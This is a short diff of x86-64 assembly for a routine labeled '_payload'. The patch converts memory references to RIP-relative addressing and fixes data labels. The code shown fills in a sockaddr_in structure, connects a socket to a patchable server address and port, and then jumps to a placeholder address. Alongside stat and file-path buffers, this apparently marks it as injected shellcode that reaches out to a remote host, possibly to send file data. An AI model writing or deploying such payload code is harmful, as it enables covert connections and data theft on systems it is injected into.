@@ -58,11 +58,11 @@ _payload:
 	mov r13, rax
 
 	; Prepare sockaddr_in structure
-	mov word [CONNECT_BUFFER], 2          ; sin_family (AF_INET)
+	mov word [rel CONNECT_BUFFER], 2          ; sin_family (AF_INET)
 	movzx rax, word [rel SERVER_PORT]
-	mov word [CONNECT_BUFFER + 2], ax ; sin_port
+	mov word [rel CONNECT_BUFFER + 2], ax ; sin_port
 	mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
-	mov dword [CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
+	mov dword [rel CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
 	
 	; Connect the socket
 	mov rax, 42						; syscall number for connect
@@ -95,12 +95,12 @@ _payload:
 	syscall
 
 	popx rax, rdi, rsi, rdx, r10
-	jmp     0x0
+	jmp     [rel 0x0]
 	; ret
 
-STATBUFFER		times 144 db 0
-CONNECT_BUFFER	times 16 db 0
-FILEPATH		times 1024 db 0
-SERVER_PORT		dd 0x0
-SERVER_ADDR		dw 0x4242
+STATBUFFER:		times 144 db 0
+CONNECT_BUFFER:	times 16 db 0
+FILEPATH:		times 1024 db 0
+SERVER_PORT:	dd 0x0
+SERVER_ADDR:	dw 0x4242
 _payload_size:	dq $-_payload
